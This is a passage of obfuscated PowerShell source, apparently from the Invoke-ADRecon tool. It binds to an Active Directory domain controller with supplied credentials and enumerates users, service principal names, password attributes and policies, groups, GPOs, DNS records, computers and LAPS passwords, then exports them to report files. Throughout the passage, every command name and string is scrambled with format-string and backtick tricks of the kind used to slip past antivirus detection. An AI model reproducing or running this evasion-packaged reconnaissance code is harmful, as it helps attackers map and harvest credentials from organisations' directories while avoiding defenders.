        ${X`MlP`ATh} = [System.IO.DirectoryInfo] -join(${a`dR`oUTpU`Tdir},'\',("{1}{2}{0}" -f'iles','XML-','F'))
        &("{1}{2}{0}"-f 'em','N','ew-It') ${x`MLP`ATH} -type ("{2}{1}{0}"-f 'ory','ct','dire') | &("{1}{0}" -f't-Null','Ou')
        If (!(&("{3}{0}{1}{2}"-f 't-','Pat','h','Tes') ${XMLpA`TH}))
        {
            &("{0}{1}{2}{3}" -f'Wr','ite-','Ou','tput') ("{16}{0}{6}{15}{10}{7}{8}{11}{13}{9}{4}{1}{14}{3}{5}{2}{12}"-f'nvoke','re','director','te output','ot c',' ','-AD','rro','r, ','uld n','] E','c','y','o','a','Recon','[I')
            Return ${N`ULl}
        }
        &("{2}{3}{4}{0}{1}"-f 'bl','e','Remo','v','e-Varia') ("{1}{0}"-f'DRXML','A')
    }

    If (${ADr`J`soN})
    {
        ${jSOn`pa`Th} = [System.IO.DirectoryInfo] -join(${aDrO`UTp`UtdIR},'\',("{2}{1}{0}"-f'les','-Fi','JSON'))
        &("{1}{0}"-f'tem','New-I') ${Js`O`NPaTh} -type ("{1}{2}{0}"-f 'ry','d','irecto') | &("{0}{1}{2}" -f 'Out','-','Null')
        If (!(&("{1}{0}" -f't-Path','Tes') ${JsON`PA`TH}))
        {
            &("{3}{2}{0}{1}" -f'pu','t','-Out','Write') ("{0}{10}{2}{7}{5}{9}{8}{1}{4}{3}{6}" -f'[Inv',' output di','DRec','ct','re','ould','ory','on] Error, c','ot create',' n','oke-A')
            Return ${n`ULL}
        }
        &("{0}{1}{2}" -f'Remo','ve-Variab','le') ("{1}{0}"-f'DRJSON','A')
    }

    If (${ad`RH`Tml})
    {
        ${HtmL`Pa`TH} = [System.IO.DirectoryInfo] -join(${ADROutPu`T`dIR},'\',("{1}{2}{0}"-f 'es','HT','ML-Fil'))
        &("{0}{1}" -f 'Ne','w-Item') ${HtMlpA`Th} -type ("{1}{0}"-f'rectory','di') | &("{2}{1}{0}"-f '-Null','t','Ou')
        If (!(&("{2}{0}{1}" -f 'es','t-Path','T') ${HTML`paTH}))
        {
            &("{3}{1}{0}{2}"-f 'e-Out','it','put','Wr') ("{1}{0}{8}{2}{9}{7}{4}{5}{6}{3}" -f'oke-','[Inv','uld no','y','e',' out','put director','reat','ADRecon] Error, co','t c')
            Return ${N`ULl}
        }
        &("{0}{2}{1}{4}{3}"-f'Rem','-Va','ove','ble','ria') ("{1}{0}" -f'RHTML','AD')
    }

    
    If (${uSeA`ltC`RedS} -and (${m`etH`OD} -eq ("{1}{0}"-f'WS','AD')))
    {
        If (!(&("{2}{0}{3}{1}"-f'-','th','Test','Pa') ("{1}{0}" -f ':','ADR')))
        {
            Try
            {
                &("{0}{2}{1}" -f'Ne','ive','w-PSDr') -PSProvider ("{0}{1}{2}{3}" -f'Ac','tiv','eDire','ctory') -Name ("{0}{1}"-f 'A','DR') -Root "" -Server ${d`OMaiNCO`NtROL`lER} -Credential ${CRE`dEN`TiAL} -ErrorAction ("{1}{0}"-f 'op','St') | &("{1}{0}{2}" -f'Nul','Out-','l')
            }
            Catch
            {
                &("{3}{2}{0}{1}"-f 'Outp','ut','-','Write') "[Invoke-ADRecon] $($_.Exception.Message) "
                If (${AdROu`TpuTD`Ir})
                {
                    &("{6}{3}{5}{2}{0}{1}{4}"-f 'mptyADROu','t','E','emove','putDir','-','R') ${aDr`OUTP`Ut`dIr} ${o`UtPUtty`pE}
                }
                Return ${N`ULL}
            }
        }
        Else
        {
            &("{2}{4}{3}{1}{0}" -f 'e','iv','R','move-PSDr','e') ("{1}{0}" -f 'DR','A')
            Try
            {
                &("{0}{1}{2}{3}"-f 'New-P','S','Dri','ve') -PSProvider ("{2}{4}{3}{1}{0}" -f'y','or','Acti','rect','veDi') -Name ("{0}{1}" -f 'AD','R') -Root "" -Server ${d`omAI`NcOntroll`ER} -Credential ${creDEN`Ti`AL} -ErrorAction ("{0}{1}"-f'St','op') | &("{0}{2}{1}" -f 'Out-','ull','N')
            }
            Catch
            {
                &("{0}{3}{1}{2}" -f'W','ite-Outp','ut','r') "[Invoke-ADRecon] $($_.Exception.Message) "
                If (${aDR`o`U`T`puTDir})
                {
                    &("{5}{0}{6}{3}{1}{4}{2}" -f'move','mpty','ir','E','ADROutputD','Re','-') ${A`DrOuTpUtD`Ir} ${ouTP`U`TTYPE}
                }
                Return ${Nu`ll}
            }
        }
        &("{3}{0}{1}{2}"-f '-','Locat','ion','Set') ("{1}{0}"-f'R:','AD')
        &("{0}{3}{2}{1}"-f'W','te-Debug','i','r') ("{2}{1}{3}{5}{4}{0}"-f 'ated',' ','ADR','PS',' Cre','Drive')
        
    }

    If (${m`et`hod} -eq ("{1}{0}"-f 'AP','LD'))
    {
        If (${u`seAL`TCreDS})
        {
            Try
            {
                ${o`B`jDomaIn} = &("{3}{0}{2}{1}" -f'-Ob','ect','j','New') ("{3}{8}{2}{10}{7}{4}{9}{0}{6}{1}{5}" -f 'ices.D','tory','em.D','S','yS','Entry','irec','or','yst','erv','irect') "LDAP://$($DomainController)", ${CREDen`Ti`Al}."uSEr`N`AME",${cR`eDEnt`Ial}.("{2}{4}{5}{0}{3}{1}" -f'ti','l','GetNetw','a','o','rkCreden').Invoke()."Pa`sSWoRd"
                ${OB`jDomA`In`R`OOtdSE} = &("{0}{1}{3}{2}"-f 'New','-O','ject','b') ("{2}{5}{1}{0}{6}{3}{4}"-f 'ryServic','tem.Directo','Sy','r','y','s','es.DirectoryEnt') "LDAP://$($DomainController)/RootDSE", ${Cre`dEN`TiAL}."u`SErNA`me",${cReDeN`T`IAL}.("{1}{2}{4}{3}{0}"-f'al','GetNet','wo','ti','rkCreden').Invoke()."paSS`W`oRd"
            }
            Catch
            {
                &("{1}{2}{0}{3}" -f 'Out','Write','-','put') "[Invoke-ADRecon] $($_.Exception.Message) "
                If (${adroUt`pUTd`Ir})
                {
                    &("{5}{2}{1}{0}{3}{4}{6}{7}"-f 'Emp','e-','emov','tyA','D','R','ROutp','utDir') ${ad`RoUTp`UTDiR} ${OU`Tputt`YpE}
                }
                Return ${nU`Ll}
            }
            If(!(${OBj`dom`A`iN}."NA`mE"))
            {
                &("{1}{0}{2}"-f 'te-O','Wri','utput') ("{2}{3}{10}{5}{7}{11}{6}{0}{4}{9}{8}{1}"-f 'AP bind ','cessful','[Invo','ke','Uns','DRec','D','on','c','u','-A','] L')
                If (${adrOUT`pU`TDir})
                {
                    &("{5}{0}{4}{3}{2}{1}" -f 'o','r','yADROutputDi','mpt','ve-E','Rem') ${a`d`R`OUtpuTdiR} ${oU`Tp`Uttype}
                }
                Return ${NU`Ll}
            }
            Else
            {
                &("{1}{0}{2}{3}"-f 't','Wri','e-','Output') ("{7}{4}{1}{2}{5}{6}{3}{0}" -f'ssful','P b','i','ce','A','n','d Suc','[*] LD')
            }
        }
        Else
        {
            ${oBjDo`ma`IN} = [ADSI]""
            ${ObJdoM`A`INR`OOtDSe} = ([ADSI] ("{0}{1}{3}{2}" -f 'LD','AP://Roo','SE','tD'))
            If(!(${ObJ`Do`MAIN}."nA`ME"))
            {
                &("{0}{2}{3}{1}" -f 'Writ','t','e','-Outpu') ("{8}{1}{2}{9}{7}{3}{0}{6}{4}{5}" -f'ns','oke-ADRec','on]','DAP bind U','s','sful','ucce','L','[Inv',' ')
                If (${aDr`o`UT`putDiR})
                {
                    &("{1}{4}{2}{3}{0}" -f'tDir','Remo','DRO','utpu','ve-EmptyA') ${ADrOUtp`UTd`iR} ${ou`T`pUtTyPe}
                }
                Return ${n`ULL}
            }
        }
        &("{3}{0}{2}{1}"-f'ri','g','te-Debu','W') ("{0}{5}{1}{2}{4}{3}" -f 'LD','P Bing Suc','c','ful','ess','A')
        
    }

    &("{2}{0}{1}{3}"-f 'u','tp','Write-O','ut') ('[*]'+' '+'C'+'om'+'menci'+'ng '+'- '+"$date")
    If (${Ad`RDOM`A`IN})
    {
        &("{1}{2}{3}{0}" -f 'Output','Wr','it','e-') ("{0}{1}{2}"-f '[-','] Dom','ain')
        ${aDRobJ`E`Ct} = &("{1}{0}{3}{2}"-f't-AD','Ge','omain','RD') -Method ${meth`oD} -objDomain ${o`BJ`DO`MaiN} -objDomainRootDSE ${objdomaINRo`o`TD`se} -DomainController ${doMaiNc`o`N`TRoLL`er} -Credential ${cr`ed`E`NtiAL}
        If (${aDrOBj`E`Ct})
        {
            &("{0}{2}{3}{1}"-f 'Exp','ADR','or','t-') -ADRObj ${A`dRoBJ`ECt} -ADROutputDir ${aD`Rout`Pu`Tdir} -OutputType ${o`UT`PutTyPE} -ADRModuleName ("{0}{2}{1}"-f'Dom','n','ai')
            &("{3}{0}{1}{4}{2}" -f 'o','ve-Varia','le','Rem','b') ("{0}{2}{1}"-f'ADR','ect','Obj')
        }
        &("{1}{3}{2}{0}" -f 'ble','Rem','e-Varia','ov') ("{1}{2}{0}"-f'ain','ADRD','om')
    }
    If (${a`Drf`ORe`St})
    {
        &("{0}{1}{2}"-f 'Write-O','u','tput') ("{1}{3}{0}{2}" -f ' Fores','[-','t',']')
        ${A`DROb`J`ECt} = &("{0}{2}{1}"-f 'Get-ADRFore','t','s') -Method ${MeT`HoD} -objDomain ${obj`Do`m`Ain} -objDomainRootDSE ${oB`jDOmA`IN`ROoTdSe} -DomainController ${d`oMaINCONTrOL`l`er} -Credential ${cREde`N`TIal}
        If (${ADr`oB`jE`cT})
        {
            &("{0}{2}{1}" -f 'Export-','R','AD') -ADRObj ${Ad`Ro`BJ`ecT} -ADROutputDir ${a`d`Ro`UTPU`TDIR} -OutputType ${ou`TpuTTY`pE} -ADRModuleName ("{1}{0}{2}" -f 'ores','F','t')
            &("{3}{0}{4}{1}{2}"-f've-V','b','le','Remo','aria') ("{1}{0}{2}"-f'je','ADROb','ct')
        }
        &("{2}{4}{1}{3}{0}" -f 'ble','e-Vari','Re','a','mov') ("{2}{1}{0}"-f 'st','re','ADRFo')
    }
    If (${aD`Rtr`U`st})
    {
        &("{1}{3}{2}{0}"-f 'ut','Wr','p','ite-Out') ("{2}{0}{1}"-f '-] T','rusts','[')
        ${AD`Ro`BJeCt} = &("{0}{2}{1}{3}"-f 'G','RTrus','et-AD','t') -Method ${M`E`THOD} -objDomain ${o`BJ`DOM`AIN}
        If (${adR`O`BjeCT})
        {
            &("{2}{0}{1}" -f'ort-A','DR','Exp') -ADRObj ${a`DrObJ`ECt} -ADROutputDir ${aDr`ouTput`d`ir} -OutputType ${O`UTp`UTt`YPE} -ADRModuleName ("{1}{0}"-f'usts','Tr')
            &("{1}{2}{0}"-f 'able','Remov','e-Vari') ("{0}{1}{2}" -f 'ADR','Ob','ject')
        }
        &("{2}{0}{1}"-f'emove-Var','iable','R') ("{1}{0}{2}"-f 'DRTr','A','ust')
    }
    If (${ADR`Si`Te})
    {
        &("{1}{2}{0}"-f'utput','W','rite-O') ("{1}{2}{0}"-f '] Sites','[','-')
        ${ad`RoBJe`CT} = &("{0}{1}{2}" -f 'Ge','t-ADR','Site') -Method ${Me`TH`Od} -objDomain ${obj`do`m`AiN} -objDomainRootDSE ${o`BJdo`mai`NRo`oTdSe} -DomainController ${DOmaI`NCOn`TrO`LleR} -Credential ${CreD`E`NtI`Al}
        If (${Adro`BJe`cT})
        {
            &("{0}{2}{1}"-f 'Exp','t-ADR','or') -ADRObj ${ADro`BjE`CT} -ADROutputDir ${AdRO`UTpU`TD`iR} -OutputType ${oUtPuT`TY`pE} -ADRModuleName ("{0}{1}" -f'S','ites')
            &("{1}{3}{0}{2}"-f 'aria','Rem','ble','ove-V') ("{3}{1}{2}{0}"-f'bject','DR','O','A')
        }
        &("{0}{2}{3}{1}"-f'Re','able','move-Va','ri') ("{0}{1}" -f'AD','RSite')
    }
    If (${ADRsu`BN`Et})
    {
        &("{2}{1}{0}" -f 'put','t','Write-Ou') ("{1}{2}{0}"-f 'nets','[-','] Sub')
        ${ADRO`B`J`Ect} = &("{0}{1}{2}"-f'Get-','ADRSubne','t') -Method ${m`E`THoD} -objDomain ${OBjdo`M`Ain} -objDomainRootDSE ${ObjDo`mainRo`O`TDse} -DomainController ${doma`i`NCOntR`OLL`eR} -Credential ${c`RE`dENti`AL}
        If (${adRo`B`j`eCt})
        {
            &("{2}{1}{0}"-f 'R','t-AD','Expor') -ADRObj ${Ad`R`oBJEcT} -ADROutputDir ${ADrO`U`TPuTDiR} -OutputType ${o`Utp`U`TtyPe} -ADRModuleName ("{2}{0}{1}"-f 'bnet','s','Su')
            &("{0}{2}{1}" -f 'Remove-Va','ble','ria') ("{0}{1}{2}"-f 'A','DRO','bject')
        }
        &("{2}{1}{0}{4}{3}"-f 'ove-Var','em','R','able','i') ("{1}{2}{3}{0}"-f 't','ADRS','ubn','e')
    }
    If (${aDr`s`C`hemaHIs`TOrY})
    {
        &("{2}{0}{1}{3}" -f'e','-Ou','Writ','tput') ("{5}{7}{9}{1}{6}{2}{4}{3}{0}{8}" -f' ti',' Schema','ke','e',' som','[','History - May ta','-','me',']')
        ${Ad`R`objEct} = &("{3}{2}{0}{1}"-f'hema','History','et-ADRSc','G') -Method ${M`e`ThoD} -objDomain ${o`B`JDoma`In} -objDomainRootDSE ${O`BjdOmA`iNR`OOtdSe} -DomainController ${domAin`cO`N`TRolLeR} -Credential ${cr`edE`NTIal}
        If (${A`DR`OBjEcT})
        {
            &("{3}{2}{0}{1}"-f 'ort-A','DR','xp','E') -ADRObj ${adRO`BJe`Ct} -ADROutputDir ${A`dRoU`TpU`TdiR} -OutputType ${ou`T`PUtt`ype} -ADRModuleName ("{2}{0}{1}{3}" -f'ch','emaH','S','istory')
            &("{1}{0}{3}{2}{4}" -f 'o','Rem','riab','ve-Va','le') ("{1}{0}{2}" -f 'DROb','A','ject')
        }
        &("{0}{2}{3}{1}"-f'R','able','e','move-Vari') ("{1}{2}{0}{3}"-f 'Hi','ADRSchem','a','story')
    }
    If (${adR`PA`sswoRD`pO`LiCY})
    {
        &("{3}{1}{2}{0}"-f 't','tp','u','Write-Ou') ("{4}{5}{0}{3}{2}{1}"-f 'D','ord Policy','fault Passw','e','[-]',' ')
        ${A`dr`OB`jeCt} = &("{3}{1}{6}{2}{4}{0}{5}" -f 'Poli','t','aultPass','Ge','word','cy','-ADRDef') -Method ${Me`THod} -objDomain ${Ob`jDo`mAiN}
        If (${Ad`RoB`J`Ect})
        {
            &("{0}{1}{2}{3}" -f 'E','x','port','-ADR') -ADRObj ${A`Dr`O`BJEct} -ADROutputDir ${A`Dr`OU`TPutDir} -OutputType ${oUT`Pu`TT`ypE} -ADRModuleName ("{0}{3}{1}{2}{4}" -f'Def','ltPasswor','dPol','au','icy')
            &("{1}{2}{0}"-f'e-Variable','Remo','v') ("{0}{2}{1}"-f 'AD','ject','ROb')
        }
        &("{2}{1}{3}{0}" -f'le','emove-Vari','R','ab') ("{0}{2}{3}{1}" -f'ADRPass','licy','wordP','o')
    }
    If (${aD`RfI`NEgRAin`E`DP`AssWOrDPOlICy})
    {
        &("{0}{3}{1}{2}"-f'Wri','tp','ut','te-Ou') ("{0}{6}{2}{3}{7}{1}{10}{4}{8}{5}{9}"-f'[-','r','rained Pa','s','icy - May need a Privileged','Acc','] Fine G','swo',' ','ount','d Pol')
        ${a`DR`obJeCt} = &("{5}{6}{1}{3}{4}{7}{2}{0}{8}" -f 'ol','D','edPasswordP','RFin','eGr','Get','-A','ain','icy') -Method ${me`T`hod} -objDomain ${ObJD`OMA`iN}
        If (${AD`ROBJE`cT})
        {
            &("{0}{1}{2}" -f'Expo','rt-AD','R') -ADRObj ${ad`R`O`BjeCT} -ADROutputDir ${AdR`ouT`PUT`d`Ir} -OutputType ${o`UtPuttY`PE} -ADRModuleName ("{6}{2}{1}{4}{0}{5}{3}" -f 'rdP','neGrai','i','licy','nedPasswo','o','F')
            &("{2}{0}{3}{1}{4}" -f 've-','ariab','Remo','V','le') ("{2}{1}{0}"-f'ject','b','ADRO')
        }
        &("{1}{0}{3}{2}" -f'ove','Rem','le','-Variab') ("{8}{6}{4}{5}{2}{7}{3}{1}{0}"-f'cy','oli','e','asswordP','eGrai','n','in','dP','ADRF')
    }
    If (${AdRdoMai`NcONtrO`l`lers})
    {
        &("{0}{2}{1}{3}" -f 'W','Ou','rite-','tput') ("{3}{4}{5}{6}{1}{2}{0}" -f'rs','Contro','lle','[-] ','D','omai','n ')
        ${ADrob`J`eCT} = &("{3}{5}{2}{4}{1}{0}" -f'ller','o','nt','G','r','et-ADRDomainCo') -Method ${Me`Thod} -objDomain ${obJDO`m`A`IN} -Credential ${C`ReDe`N`TiaL}
        If (${aD`ROBje`ct})
        {
            &("{0}{1}{2}"-f 'Exp','ort-A','DR') -ADRObj ${AD`R`o`BJEct} -ADROutputDir ${A`dr`oUTPutDIr} -OutputType ${O`UTP`UTtyPe} -ADRModuleName ("{4}{1}{0}{3}{2}" -f 'oll','nContr','s','er','Domai')
            &("{0}{4}{3}{2}{1}"-f 'Remove-V','le','b','ia','ar') ("{2}{0}{1}{3}"-f 'e','c','ADRObj','t')
        }
        &("{1}{4}{0}{2}{3}" -f 'i','Remove-V','abl','e','ar') ("{2}{1}{3}{4}{5}{0}"-f'ntrollers','RDoma','AD','i','n','Co')
    }
    If (${a`DruSe`RS} -or ${a`DR`USeRSp`NS})
    {
        If (!${A`D`RusERSPnS})
        {
            &("{1}{0}{2}{3}" -f 'i','Wr','te-O','utput') ("{1}{3}{2}{5}{0}{4}" -f't','[','] Users - Ma','-','ake some time','y ')
            ${ADR`U`sErSP`Ns} = ${FaL`se}
        }
        ElseIf (!${a`dRu`seRS})
        {
            &("{0}{1}{2}{3}"-f'Writ','e-','Out','put') ("{0}{3}{1}{2}" -f'[-] U',' SP','Ns','ser')
            ${aD`R`USERS} = ${fa`l`se}
        }
        Else
        {
            &("{0}{2}{3}{1}" -f'W','t','rite-O','utpu') ("{9}{5}{1}{4}{2}{8}{3}{6}{0}{7}" -f't','ers and S','- ','ay','PNs ','s',' ','ake some time','M','[-] U')
        }
        &("{0}{3}{1}{2}"-f 'Ge','A','DRUser','t-') -Method ${meT`hod} -date ${D`Ate} -objDomain ${oB`jD`OmaIn} -DormantTimeSpan ${DO`RmantTIMES`p`An} -PageSize ${PAG`E`SIze} -Threads ${t`HrEAdS} -ADRUsers ${adRU`s`ERS} -ADRUserSPNs ${ADRuS`Er`S`pNS} -OnlyEnabled ${o`Nl`yENAbL`ed}
        &("{1}{2}{3}{0}"-f'e','Rem','ove-Va','riabl') ("{2}{0}{1}" -f 'D','RUsers','A')
        &("{2}{4}{3}{0}{1}" -f'ariabl','e','R','move-V','e') ("{1}{2}{0}"-f's','ADR','UserSPN')
    }
    If (${Adrp`ASSWoR`daT`TributES})
    {
        &("{3}{2}{0}{1}"-f 't','put','-Ou','Write') ("{3}{4}{9}{8}{2}{0}{5}{6}{1}{7}"-f 't','ri','rdA','[-] Pa','s','tribu','tes - Expe','mental','wo','s')
        ${A`drob`JECT} = &("{3}{1}{5}{0}{4}{6}{2}"-f 'Passwor','-','tes','Get','dAt','ADR','tribu') -Method ${m`e`THOD} -objDomain ${ObJD`om`A`in} -PageSize ${p`AgesI`ZE}
        If (${aDR`oB`JeCt})
        {
            &("{2}{1}{0}"-f't-ADR','por','Ex') -ADRObj ${ADrOb`J`ECT} -ADROutputDir ${ad`Ro`UtPutDIR} -OutputType ${outPuTT`Y`pe} -ADRModuleName ("{1}{0}{2}{4}{3}" -f 'w','Pass','ordA','tributes','t')
            &("{1}{3}{0}{2}" -f 'i','Remove','able','-Var') ("{0}{1}{2}{3}"-f 'ADR','Ob','j','ect')
        }
        &("{1}{3}{2}{0}" -f 'ble','Re','ia','move-Var') ("{1}{4}{0}{3}{2}" -f 'ssword','ADR','s','Attribute','Pa')
    }
    If (${ad`RG`RoUPS} -or ${ADrGr`OU`pc`HaNG`es})
    {
        If (!${adR`grOup`chAN`GeS})
        {
            &("{1}{2}{0}{3}" -f'ut','Write','-O','put') ("{3}{2}{0}{1}{5}{4}" -f ' Groups ','- ','-]','[',' some time','May take')
            ${A`drGRo`U`PChANG`Es} = ${F`A`LsE}
        }
        ElseIf (!${Ad`RG`RoupS})
        {
            &("{2}{0}{3}{1}"-f'te-O','ut','Wri','utp') ("{3}{5}{6}{1}{2}{4}{0}{7}{8}"-f 'es ','m','ber','[','ship Chang','-] G','roup Me','- May',' take some time')
            ${adr`G`RouPs} = ${FAl`SE}
        }
        Else
        {
            &("{1}{0}{3}{2}" -f'-','Write','ut','Outp') ("{3}{9}{6}{10}{7}{4}{8}{1}{0}{5}{2}"-f'e','ges - May tak','ime','[-','ip Cha',' some t',' and Membe','sh','n','] Groups','r')
        }
        &("{2}{3}{0}{1}" -f'R','Group','Get-','AD') -Method ${me`ThOD} -date ${Da`Te} -objDomain ${objdo`mA`in} -PageSize ${p`Ag`ESIZE} -Threads ${t`HReA`dS} -ADROutputDir ${adrout`Put`D`ir} -OutputType ${o`U`TPUTtY`PE} -ADRGroups ${A`drg`R`oUpS} -ADRGroupChanges ${aDRGROU`P`ChAn`g`ES}
        &("{4}{1}{3}{2}{0}" -f'e','o','ariabl','ve-V','Rem') ("{1}{2}{0}" -f 'roups','A','DRG')
        &("{0}{2}{1}{3}{4}" -f 'Remove','Va','-','ri','able') ("{2}{0}{1}" -f 'C','hanges','ADRGroup')
    }
    If (${adR`G`Ro`UPMEMB`Ers})
    {
        &("{3}{0}{2}{1}" -f'u','t','tpu','Write-O') ("{3}{6}{0}{5}{7}{1}{4}{2}"-f ' Group ',' ','me','[','- May take some ti','Membersh','-]','ips')

        ${aDRoBJ`E`cT} = &("{4}{3}{1}{2}{0}"-f 'Member','D','RGroup','et-A','G') -Method ${mETH`oD} -objDomain ${ObJD`o`mA`IN} -PageSize ${PA`GE`SIZe} -Threads ${THR`EAds}
        If (${aDrOb`j`EcT})
        {
            &("{3}{1}{2}{0}"-f'R','r','t-AD','Expo') -ADRObj ${a`dr`oB`ject} -ADROutputDir ${a`DRoU`TpUt`Dir} -OutputType ${oUt`PUTt`YpE} -ADRModuleName ("{0}{3}{1}{2}"-f'G','e','mbers','roupM')
            &("{2}{3}{0}{1}"-f've-Va','riable','R','emo') ("{2}{1}{0}{3}"-f 'c','bje','ADRO','t')
        }
        &("{2}{1}{0}{3}"-f'mo','e','R','ve-Variable') ("{1}{3}{2}{0}{4}"-f'mber','AD','roupMe','RG','s')
    }
    If (${A`DrO`Us})
    {
        &("{0}{1}{2}" -f'Wr','ite-','Output') ("{3}{0}{4}{1}{2}"-f 'onalU','s (OU','s)','[-] Organizati','nit')
        ${AdrOb`j`ecT} = &("{1}{2}{0}"-f'ROU','Get','-AD') -Method ${me`Thod} -objDomain ${OBJ`d`O`maiN} -PageSize ${pA`gE`S`izE} -Threads ${t`hrEa`ds}
        If (${ADr`OBJ`ECT})
        {
            &("{0}{2}{3}{1}"-f 'E','ADR','x','port-') -ADRObj ${adrob`J`E`ct} -ADROutputDir ${A`D`RoUtpUTD`IR} -OutputType ${ou`TPutt`Y`pe} -ADRModuleName "OUs"
            &("{0}{1}{3}{2}" -f 'Remove-','Vari','ble','a') ("{1}{2}{0}" -f 'ject','ADRO','b')
        }
        &("{2}{3}{0}{1}" -f'bl','e','R','emove-Varia') ("{1}{0}"-f 's','ADROU')
    }
    If (${Ad`RG`poS})
    {
        &("{1}{2}{0}" -f'Output','W','rite-') ("{1}{0}" -f'GPOs','[-] ')
        ${ad`Rob`JEct} = &("{1}{0}{3}{2}"-f'A','Get-','PO','DRG') -Method ${M`ET`HOD} -objDomain ${oB`j`DOmAIn} -PageSize ${PAgeS`I`Ze} -Threads ${t`h`REAdS}
        If (${aDr`o`BjeCT})
        {
            &("{2}{1}{0}" -f'ADR','-','Export') -ADRObj ${ADro`B`JECt} -ADROutputDir ${A`d`ROuTP`UtDIR} -OutputType ${o`U`TpUT`TyPe} -ADRModuleName ("{1}{0}" -f 's','GPO')
            &("{2}{1}{3}{0}" -f 'able','e-V','Remov','ari') ("{0}{2}{1}" -f 'ADRObje','t','c')
        }
        &("{1}{0}{2}{3}" -f 'ove-V','Rem','aria','ble') ("{0}{1}{2}" -f'ADRG','PO','s')
    }
    If (${aD`RgP`l`InKS})
    {
        &("{1}{0}{2}" -f'ite-Outp','Wr','ut') (("{6}{0}{5}{9}{2}{7}{1}{3}{10}{8}{4}"-f ' gPLin','of','S',' Manageme',')','ks ','[-]','cope ','SOM','- ','nt ('))
        ${a`dro`Bj`ecT} = &("{1}{0}{2}{3}"-f'-AD','Get','RgPLin','k') -Method ${m`eTH`Od} -objDomain ${ObjD`oM`AIN} -PageSize ${Pag`Es`iZE} -Threads ${th`ReA`DS}
        If (${Ad`R`objECT})
        {
            &("{0}{1}{2}" -f 'Export-','A','DR') -ADRObj ${A`d`ROB`JeCT} -ADROutputDir ${A`Drou`Tp`UTd`ir} -OutputType ${O`UT`pUtT`Ype} -ADRModuleName ("{0}{1}"-f'gPLi','nks')
            &("{0}{2}{4}{3}{1}" -f 'Remov','e','e-Va','l','riab') ("{0}{2}{1}" -f 'ADRO','ct','bje')
        }
        &("{0}{2}{1}" -f'Remove','Variable','-') ("{0}{2}{1}" -f'AD','inks','RgPL')
    }
    If (${ADRDN`szon`es} -or ${Ad`R`dnSReCORDS})
    {
        If (!${A`D`RdNSREC`ords})
        {
            &("{1}{0}{2}"-f 'e','Writ','-Output') ("{2}{1}{0}"-f'S Zones','N','[-] D')
            ${A`Dr`dNs`RE`coRDs} = ${f`AlSe}
        }
        ElseIf (!${aDRd`N`SZoNes})
        {
            &("{3}{1}{2}{0}"-f 't','O','utpu','Write-') ("{3}{2}{0}{1}"-f'co','rds','S Re','[-] DN')
            ${a`DRDNS`Z`OneS} = ${f`AL`se}
        }
        Else
        {
            &("{0}{1}{2}" -f 'Write-O','ut','put') ("{2}{1}{0}{3}{4}"-f'NS Zones and Re','] D','[-','cord','s')
        }
        &("{3}{4}{0}{1}{2}"-f'ADRDNSZo','n','e','Ge','t-') -Method ${mET`hod} -objDomain ${O`BJdO`mAIn} -DomainController ${Do`mainCo`NtR`o`LlEr} -Credential ${CRedE`N`T`ial} -PageSize ${P`AgesIze} -ADROutputDir ${a`Dr`OU`TPUTDIr} -OutputType ${Ou`T`puTt`ypE} -ADRDNSZones ${ADRdn`S`Z`oneS} -ADRDNSRecords ${a`dR`DnsR`ec`ORdS}
        &("{4}{1}{2}{3}{0}"-f'le','em','ove-V','ariab','R') ("{2}{1}{3}{0}" -f'SZones','DRD','A','N')
    }
    If (${aDrPRI`NT`E`Rs})
    {
        &("{0}{2}{1}" -f 'W','te-Output','ri') ("{2}{1}{0}" -f'ers','t','[-] Prin')
        ${a`DRo`BjecT} = &("{3}{1}{0}{2}" -f 'te','et-ADRPrin','r','G') -Method ${M`ET`hoD} -objDomain ${OBj`doMA`in} -PageSize ${P`AgEsi`ZE} -Threads ${tHrE`Ads}
        If (${AdROB`j`e`CT})
        {
            &("{1}{2}{0}" -f'ort-ADR','E','xp') -ADRObj ${a`dROb`j`ECt} -ADROutputDir ${Ad`ROu`Tpu`TdIR} -OutputType ${OutPut`T`yPe} -ADRModuleName ("{1}{2}{0}"-f 's','Printe','r')
            &("{0}{1}{3}{2}"-f'Re','mo','Variable','ve-') ("{0}{1}{2}" -f 'ADRO','bj','ect')
        }
        &("{3}{0}{1}{4}{2}"-f 'm','ove-Vari','e','Re','abl') ("{0}{1}{2}"-f 'A','D','RPrinters')
    }
    If (${AdR`COM`put`ers} -or ${a`Dr`comPUteR`sP`Ns})
    {
        If (-Not ${A`Dr`com`pUtErSPns})
        {
            &("{0}{1}{2}" -f'Write-O','utp','ut') ("{5}{3}{1}{4}{2}{0}{6}"-f ' take some','ters ','May','-] Compu','- ','[',' time')
            ${ad`Rco`Mp`UtEr`sPns} = ${Fa`LsE}
        }
        ElseIf (-Not ${AdRCoM`pUt`e`RS})
        {
            &("{1}{2}{0}"-f '-Output','Wri','te') ("{0}{5}{1}{2}{3}{4}"-f'[-] ','mpu','t','e','r SPNs','Co')
            ${A`DRC`OMPutERS} = ${f`Alse}
        }
        Else
        {
            &("{2}{1}{0}" -f'tput','-Ou','Write') ("{4}{1}{7}{5}{3}{8}{0}{2}{6}" -f' May ',' Com','t',' and SPNs','[-]','ers','ake some time','put',' -')
        }

        &("{1}{2}{0}{3}" -f'Co','Ge','t-ADR','mputer') -Method ${MEth`OD} -date ${d`ATe} -objDomain ${objD`OMA`In} -DormantTimeSpan ${do`RMaNtT`Ime`SpaN} -PassMaxAge ${pAsS`m`AxAge} -PageSize ${pAG`e`siZE} -Threads ${TH`REA`ds} -ADRComputers ${aDr`COmPu`TERS} -ADRComputerSPNs ${ad`R`co`MpUTERSpNs} -OnlyEnabled ${ON`l`YENabL`eD}

        &("{1}{3}{0}{2}" -f'aria','Rem','ble','ove-V') ("{1}{2}{0}"-f'ers','AD','RComput')
        &("{1}{3}{2}{0}" -f 'able','Remove-','i','Var') ("{2}{1}{0}{3}"-f 'm','o','ADRC','puterSPNs')
    }
    If (${Ad`RLa`pS})
    {
        &("{0}{3}{1}{2}" -f'Writ','utpu','t','e-O') ("{4}{2}{5}{6}{0}{3}{1}{10}{8}{7}{9}"-f 'ged Ac','t t','-] LAPS - Need','coun','[','s Pri','vile','the passw',' ','ords','o get')

        ${AD`R`LapsChEcK} = &("{2}{3}{1}{0}{4}"-f 'DRLAPS','A','Ge','t-','Check') -Method ${MeT`HOd} -objDomainRootDSE ${OBJ`D`OmA`INro`oTDsE} -DomainController ${DoMAiN`C`o`NTr`OlL`eR} -Credential ${cRed`En`TI`Al}

        If (${adR`LaPScH`E`cK})
        {
